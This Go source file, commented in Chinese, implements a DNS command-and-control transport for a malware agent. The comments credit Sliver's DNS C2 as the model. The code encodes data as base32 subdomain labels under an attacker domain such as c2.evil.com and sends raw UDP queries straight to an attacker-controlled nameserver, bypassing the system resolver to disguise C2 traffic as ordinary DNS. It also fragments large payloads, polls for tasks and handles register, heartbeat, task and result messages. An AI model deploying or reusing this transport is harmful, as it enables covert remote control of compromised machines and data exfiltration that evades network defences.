// Package dns 提供 DNS C2 传输支持。
// 借鉴 Sliver 的 DNS C2 — 通过 DNS TXT/A 记录进行隐蔽通信。
//
// 原理：将 C2 流量伪装为正常的 DNS 查询和响应
//   - Agent 将加密数据编码为 DNS 子域名查询
//   - 例: <encrypted_data>.c2.evil.com → TXT/A 记录查询
//   - 服务端通过 DNS 响应返回加密数据
//
// 编码方案：Base32/Hex 编码（DNS 标签最大 63 字符）
//
// DNS 查询方式：
//   - 直接 UDP 发送到指定 Nameserver（攻击者控制的 DNS）
//   - 不依赖系统 DNS 解析器
package transport

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base32"
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

// DNSConfig 是 DNS C2 的配置。
type DNSConfig struct {
	Domain     string   // C2 域名 (如 "c2.evil.com")
	Nameserver string   // DNS 服务器地址 (如 "8.8.8.8:53")
	RecordType string   // 查询记录类型: "A" 或 "TXT"
	Resolvers  []string // 候选解析器列表，启动时自动测速选最快
}

// DNSChannel 是 DNS C2 通信通道。
type DNSChannel struct {
	config   *DNSConfig
}

// NewDNSChannel 创建 DNS C2 通道。
// 如果配置了多个候选解析器，自动测速选择最快的。
func NewDNSChannel(config *DNSConfig) *DNSChannel {
	// Resolver benchmarking: pick fastest if multiple resolvers provided
	if len(config.Resolvers) > 1 && config.Nameserver == "" {
		if best, err := BenchmarkResolvers(config.Resolvers, config.Domain, 5*time.Second); err == nil {
			config.Nameserver = best
		} else if len(config.Resolvers) > 0 {
			config.Nameserver = config.Resolvers[0]
		}
	} else if config.Nameserver == "" && len(config.Resolvers) == 1 {
		config.Nameserver = config.Resolvers[0]
	}
	return &DNSChannel{config: config}
}

// Send 通过 DNS 查询发送数据并等待响应。
// 将数据 base32 编码后作为子域名查询，从 DNS 响应中获取 C2 指令。
// 大载荷会自动分片（P1-2: DNS fragmentation）。
func (d *DNSChannel) Send(data []byte) ([]byte, error) {
	encoded := base32.StdEncoding.EncodeToString(data)
	labels := splitLabels(encoded)
	fqdn := strings.Join(labels, ".") + "." + d.config.Domain

	// DNS FQDN must not exceed 253 bytes (RFC 1035)
	if len(fqdn) > 253 {
		// P1-2: Fragment large payloads into multiple DNS queries
		return d.sendFragmented(data)
	}

	var rawData []byte
	var err error
	switch d.config.RecordType {
	case "TXT":
		rawData, err = d.queryTXT(fqdn)
	case "A":
		rawData, err = d.queryA(fqdn)
	default:
		rawData, err = d.queryTXT(fqdn)
	}
	if err != nil {
		return nil, err
	}

	// 尝试 base32 解码（服务器可能编码了响应）
	decoded, decErr := decodeBase32Flexible(string(rawData))
	if decErr == nil && len(decoded) > 0 {
		return decoded, nil
	}
	// 否则返回原始数据
	return rawData, nil
}

// sendFragmented 分片发送大载荷（P1-2）。
// 每片格式: <domain>.<chunk_idx>.<total_chunks>.<domain>
// 服务器按顺序重组，最后一片的响应包含完整结果。
func (d *DNSChannel) sendFragmented(data []byte) ([]byte, error) {
	// 计算每片最大可用字节数（base32 编码后约 140 字节/片）
	const maxEncodedPerChunk = 140
	chunkSize := maxEncodedPerChunk * 3 / 4 // base32 膨胀率 4/3，约 105 字节原始数据

	totalChunks := (len(data) + chunkSize - 1) / chunkSize
	if totalChunks == 0 {
		totalChunks = 1
	}

	var lastResp []byte
	for i := 0; i < totalChunks; i++ {
		start := i * chunkSize
		end := start + chunkSize
		if end > len(data) {
			end = len(data)
		}
		chunk := data[start:end]

		// 编码分片元数据: chunk_idx/total_chunks
		meta := fmt.Sprintf("%d.%d", i, totalChunks)
		encoded := base32.StdEncoding.EncodeToString(chunk)
		labels := splitLabels(encoded)
		fqdn := meta + "." + strings.Join(labels, ".") + "." + d.config.Domain

		// 确保 FQDN 不超过 253 字节
		if len(fqdn) > 253 {
			return nil, fmt.Errorf("fragment %d FQDN still too long: %d bytes", i, len(fqdn))
		}

		var err error
		switch d.config.RecordType {
		case "TXT":
			lastResp, err = d.queryTXT(fqdn)
		case "A":
			lastResp, err = d.queryA(fqdn)
		default:
			lastResp, err = d.queryTXT(fqdn)
		}
		if err != nil {
			return nil, fmt.Errorf("fragment %d/%d failed: %w", i, totalChunks, err)
		}
	}
	return lastResp, nil
}

// Recv 轮询 DNS 响应获取待处理的任务。
// 通过查询特殊子域名（如 _poll.<session_id>.domain）获取任务。
func (d *DNSChannel) Recv(sessionID string) ([]byte, error) {
	fqdn := "_poll." + sessionID + "." + d.config.Domain

	var rawData []byte
	var err error
	switch d.config.RecordType {
	case "TXT":
		rawData, err = d.queryTXT(fqdn)
	case "A":
		rawData, err = d.queryA(fqdn)
	default:
		rawData, err = d.queryTXT(fqdn)
	}
	if err != nil {
		return nil, err
	}

	// 尝试 base32 解码
	decoded, decErr := decodeBase32Flexible(string(rawData))
	if decErr == nil && len(decoded) > 0 {
		return decoded, nil
	}
	return rawData, nil
}

func (d *DNSChannel) queryTXT(fqdn string) ([]byte, error) {
	data, err := d.rawDNSQuery(fqdn, dnsTypeTXT)
	if err != nil {
		return nil, err
	}
	if len(data) == 0 {
		return nil, nil // No data is not an error, return empty
	}
	return data, nil
}

func (d *DNSChannel) queryA(fqdn string) ([]byte, error) {
	data, err := d.rawDNSQuery(fqdn, dnsTypeA)
	if err != nil {
		return nil, err
	}
	return data, nil
}

// rawDNSQuery 发送原始 UDP DNS 查询并解析响应。
// 不依赖系统 DNS 解析器，直接向指定 Nameserver 发送查询。
func (d *DNSChannel) rawDNSQuery(fqdn string, qType uint16) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 构建 DNS 查询包
	query, txID := buildDNSQuery(fqdn, qType)

	// 发送到指定 Nameserver
	conn, err := dialContextUDP(ctx, d.config.Nameserver)
	if err != nil {
		return nil, fmt.Errorf("dial DNS %s: %w", d.config.Nameserver, err)
	}
	defer conn.Close()

	_, err = conn.Write(query)
	if err != nil {
		return nil, fmt.Errorf("send DNS query: %w", err)
	}

	// 读取响应（增大到 4096 以支持 EDNS0）
	resp := make([]byte, 4096)
	n, err := conn.Read(resp)
	if err != nil {
		return nil, fmt.Errorf("read DNS response: %w", err)
	}

	return parseDNSAnswer(resp[:n], qType, txID, fqdn)
}

// buildDNSQuery 构建原始 DNS 查询包，返回查询字节和 transaction ID。
func buildDNSQuery(fqdn string, qType uint16) ([]byte, uint16) {
	buf := make([]byte, 0, 512)

	// Header (12 bytes)
	// Transaction ID (cryptographically random)
	var txIDBytes [2]byte
	if _, err := rand.Read(txIDBytes[:]); err != nil {
		txIDBytes = [2]byte{0x01, 0x00} // fallback
	}
	txID := uint16(txIDBytes[0])<<8 | uint16(txIDBytes[1])
	if txID == 0 {
		txID = 1
	}
	buf = append(buf, byte(txID>>8), byte(txID))
	// Flags: standard query, recursion desired
	buf = append(buf, 0x01, 0x00)
	// QDCount = 1
	buf = append(buf, 0x00, 0x01)
	// ANCount = 0, NSCount = 0, ARCount = 0
	buf = append(buf, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)

	// Question: encode domain name
	buf = encodeDNSName(buf, fqdn)

	// QType + QClass (IN)
	buf = append(buf, byte(qType>>8), byte(qType))
	buf = append(buf, 0x00, 0x01) // CLASS IN

	return buf, txID
}

// encodeDNSName 将域名编码为 DNS 标签格式。
func encodeDNSName(buf []byte, name string) []byte {
	labels := strings.Split(strings.TrimSuffix(name, "."), ".")
	for _, label := range labels {
		buf = append(buf, byte(len(label)))
		buf = append(buf, []byte(label)...)
	}
	buf = append(buf, 0x00) // terminator
	return buf
}

// parseDNSAnswer 解析 DNS 响应并提取数据。
func parseDNSAnswer(resp []byte, qType uint16, expectedTxID uint16, fqdn string) ([]byte, error) {
	if len(resp) < 12 {
		return nil, fmt.Errorf("response too short")
	}

	// Validate transaction ID to prevent DNS response spoofing
	respTxID := binary.BigEndian.Uint16(resp[0:2])
	if respTxID != expectedTxID {
		return nil, fmt.Errorf("DNS transaction ID mismatch: got 0x%04x, expected 0x%04x", respTxID, expectedTxID)
	}

	// Validate question section matches our query (anti-poisoning)
	// This prevents an attacker from injecting a different query's answer
	// with the same transaction ID
	questionStart := 12
	encodedQ := encodeDNSName(nil, fqdn)
	if len(resp) < questionStart+len(encodedQ) {
		return nil, fmt.Errorf("DNS response too short for question section")
	}
	if !bytes.Equal(resp[questionStart:questionStart+len(encodedQ)], encodedQ) {
		return nil, fmt.Errorf("DNS question section mismatch: possible response injection")
	}

	flags := binary.BigEndian.Uint16(resp[2:4])
	rcode := flags & 0x000F
	if rcode != 0 {
		return nil, fmt.Errorf("DNS error: rcode=%d", rcode)
	}

	anCount := binary.BigEndian.Uint16(resp[6:8])
	if anCount == 0 {
		return nil, fmt.Errorf("no answer records")
	}

	// Skip question section
	pos := 12
	pos = skipDNSName(resp, pos)
	if pos+4 > len(resp) {
		return nil, fmt.Errorf("malformed response")
	}
	pos += 4 // skip QType + QClass

	// Parse answer records
	var collected []byte
	for i := uint16(0); i < anCount && pos < len(resp); i++ {
		pos = skipDNSName(resp, pos)
		if pos+10 > len(resp) {
			break
		}
		rType := binary.BigEndian.Uint16(resp[pos : pos+2])
		rdLen := binary.BigEndian.Uint16(resp[pos+8 : pos+10])
		pos += 10
		if pos+int(rdLen) > len(resp) {
			break
		}

		if rType == qType {
			switch qType {
			case dnsTypeTXT:
				data, _ := parseTXTRecord(resp[pos : pos+int(rdLen)])
				collected = append(collected, data...)
			case dnsTypeA:
				collected = append(collected, resp[pos : pos+int(rdLen)]...)
			}
		}
		pos += int(rdLen)
	}

	if len(collected) > 0 {
		return collected, nil
	}
	return nil, fmt.Errorf("no matching record found")
}

// parseTXTRecord 从 TXT RDATA 中提取字符串。
func parseTXTRecord(rdata []byte) ([]byte, error) {
	if len(rdata) < 1 {
		return nil, fmt.Errorf("empty TXT record")
	}
	txtLen := int(rdata[0])
	if txtLen > len(rdata)-1 {
		txtLen = len(rdata) - 1
	}
	return rdata[1 : 1+txtLen], nil
}

// skipDNSName 跳过 DNS 名称字段（支持压缩指针）。
func skipDNSName(data []byte, pos int) int {
	for pos < len(data) {
		labelLen := int(data[pos])
		if labelLen == 0 {
			return pos + 1
		}
		if labelLen&0xC0 == 0xC0 {
			return pos + 2 // compression pointer
		}
		pos += 1 + labelLen
	}
	return pos
}

// DNS record type constants
const (
	dnsTypeA    = 0x0001
	dnsTypeTXT  = 0x0010
)

// dialContextUDP 创建 UDP 连接，支持上下文超时。
func dialContextUDP(ctx context.Context, addr string) (*net.UDPConn, error) {
	raddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		return nil, err
	}

	conn, err := net.DialUDP("udp", nil, raddr)
	if err != nil {
		return nil, err
	}

	// 设置读写超时
	deadline, ok := ctx.Deadline()
	if ok {
		conn.SetDeadline(deadline)
	}

	return conn, nil
}

// decodeBase32Flexible 从 base32 字符串解码数据，支持填充和无填充。
func decodeBase32Flexible(s string) ([]byte, error) {
	// 尝试无填充解码
	enc := base32.StdEncoding.WithPadding(base32.NoPadding)
	data, err := enc.DecodeString(s)
	if err == nil {
		return data, nil
	}
	// 添加填充后重试
	for len(s)%8 != 0 {
		s += "="
	}
	return base32.StdEncoding.DecodeString(s)
}

// EncodeQuery 将数据编码为 DNS 子域名查询。
func (d *DNSChannel) EncodeQuery(data []byte) (string, error) {
	encoded := base32.StdEncoding.EncodeToString(data)
	labels := splitLabels(encoded)
	fqdn := strings.Join(labels, ".") + "." + d.config.Domain
	return fqdn, nil
}

// DecodeResponse 从 DNS 响应中解码数据。
func (d *DNSChannel) DecodeResponse(response string) ([]byte, error) {
	if d.config.RecordType == "TXT" {
		return base32.StdEncoding.DecodeString(response)
	}
	return decodeARecord(response)
}

// splitLabels 将长字符串分割为 DNS 标签（每个最大 63 字符）。
func splitLabels(data string) []string {
	maxLen := 63
	var labels []string
	for len(data) > 0 {
		if len(data) > maxLen {
			labels = append(labels, data[:maxLen])
			data = data[maxLen:]
		} else {
			labels = append(labels, data)
			break
		}
	}
	return labels
}

// decodeARecord 从 A 记录 IP 地址解码数据。
func decodeARecord(ip string) ([]byte, error) {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return nil, fmt.Errorf("invalid A record: %s", ip)
	}
	var data []byte
	for _, p := range parts {
		var b byte
		if _, err := fmt.Sscanf(p, "%d", &b); err != nil {
			return nil, fmt.Errorf("invalid A record octet %q: %w", p, err)
		}
		data = append(data, b)
	}
	return data, nil
}

// BuildARecord 将 4 字节数据编码为 A 记录 IP 地址。
func BuildARecord(data []byte) string {
	if len(data) < 4 {
		data = append(data, make([]byte, 4-len(data))...)
	}
	return fmt.Sprintf("%d.%d.%d.%d", data[0], data[1], data[2], data[3])
}

// DNSMsg 是 DNS C2 消息的编码/解码结构。
type DNSMsg struct {
	Type    uint8
	Length  uint32
	Payload []byte
}

// Encode 将 DNSMsg 编码为字节流。
func (m *DNSMsg) Encode() []byte {
	buf := make([]byte, 5+len(m.Payload))
	buf[0] = m.Type
	buf[1] = byte(m.Length >> 24)
	buf[2] = byte(m.Length >> 16)
	buf[3] = byte(m.Length >> 8)
	buf[4] = byte(m.Length)
	copy(buf[5:], m.Payload)
	return buf
}

// DecodeDNSMsg 从字节流解码 DNSMsg。
func DecodeDNSMsg(data []byte) (*DNSMsg, error) {
	if len(data) < 5 {
		return nil, fmt.Errorf("data too short for DNSMsg")
	}
	length := uint32(data[1])<<24 | uint32(data[2])<<16 | uint32(data[3])<<8 | uint32(data[4])
	if uint32(len(data)) < 5+length {
		return nil, fmt.Errorf("data length mismatch")
	}
	return &DNSMsg{
		Type:    data[0],
		Length:  length,
		Payload: data[5 : 5+length],
	}, nil
}

// 消息类型常量
const (
	MsgTypeRegister  uint8 = 1
	MsgTypeHeartbeat uint8 = 2
	MsgTypeTask      uint8 = 3
	MsgTypeResult    uint8 = 4
	MsgTypePoll      uint8 = 5
)

// DNSQueryResponse 模拟一次 DNS C2 交互。
type DNSQueryResponse struct {
	Query    string
	Response string
}

// BenchmarkResolvers 对候选 DNS 解析器测速，返回最快的一个。
// 借鉴 Sliver 的 resolver benchmark — 通过发送探测查询测量 RTT。
func BenchmarkResolvers(resolvers []string, domain string, timeout time.Duration) (string, error) {
	if len(resolvers) == 0 {
		return "", fmt.Errorf("no resolvers to benchmark")
	}
	if len(resolvers) == 1 {
		return resolvers[0], nil
	}

	type result struct {
		addr string
		rtt  time.Duration
	}

	var mu sync.Mutex
	var results []result
	var wg sync.WaitGroup

	for _, addr := range resolvers {
		wg.Add(1)
		go func(r string) {
			defer wg.Done()
			start := time.Now()
			conn, err := net.DialTimeout("udp", r, timeout)
			if err != nil {
				return
			}
			defer conn.Close()

			// 发送一个无意义的 DNS 查询用于测速
			query, txID := buildDNSQuery(domain, dnsTypeA)
			conn.Write(query)

			resp := make([]byte, 512)
			conn.SetReadDeadline(time.Now().Add(timeout))
			n, err := conn.Read(resp)
			if err != nil {
				return
			}

			// 验证响应
			if n < 12 || binary.BigEndian.Uint16(resp[0:2]) != txID {
				return
			}

			rtt := time.Since(start)
			mu.Lock()
			results = append(results, result{addr: r, rtt: rtt})
			mu.Unlock()
		}(addr)
	}

	// 等待所有测速完成或超时
	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(timeout + 2*time.Second):
	}

	if len(results) == 0 {
		// 全部超时，返回第一个
		return resolvers[0], nil
	}

	// 找到最快的
	best := results[0]
	for _, r := range results[1:] {
		if r.rtt < best.rtt {
			best = r
		}
	}
	return best.addr, nil
}
